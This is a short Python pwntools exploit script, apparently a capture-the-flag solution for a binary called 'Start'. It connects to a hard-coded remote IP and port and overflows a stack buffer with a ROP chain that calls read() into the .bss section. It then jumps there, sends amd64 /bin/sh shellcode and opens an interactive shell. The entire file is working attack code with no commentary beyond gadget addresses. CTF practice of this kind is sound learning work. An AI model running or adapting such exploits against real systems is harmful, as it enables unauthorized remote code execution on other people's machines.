#!/usr/bin/env python

from pwn import *
import time

context(os='linux', arch='amd64')
shellcode = asm(shellcraft.amd64.sh())

s = remote('66.172.33.77', 10002)

elf = ELF('Start')

bss_addr = elf.bss()
read_addr = elf.symbols['read']

# read:
#   rax: 0x0
#   rdi: unsigned int fd
#   rsi: char *buf
#   rdx: size_t count

# ssize_t read(int fildes, void *buf, size_t nbytes);

# 0x00000000004005c3 : pop rdi ; ret
pop_rdi_ret_addr = 0x4005c3

# 0x00000000004005c1 : pop rsi ; pop r15 ; ret
pop_rsi_pop_r15_ret_addr = 0x4005c1

payload = 'A' * 24
payload += p64(pop_rdi_ret_addr)
payload += p64(0)
payload += p64(pop_rsi_pop_r15_ret_addr)
payload += p64(bss_addr)
payload += 'A' * 8
payload += p64(read_addr)
payload += p64(bss_addr)

s.send(payload)
sleep(0.5)
s.send(shellcode)

s.interactive()



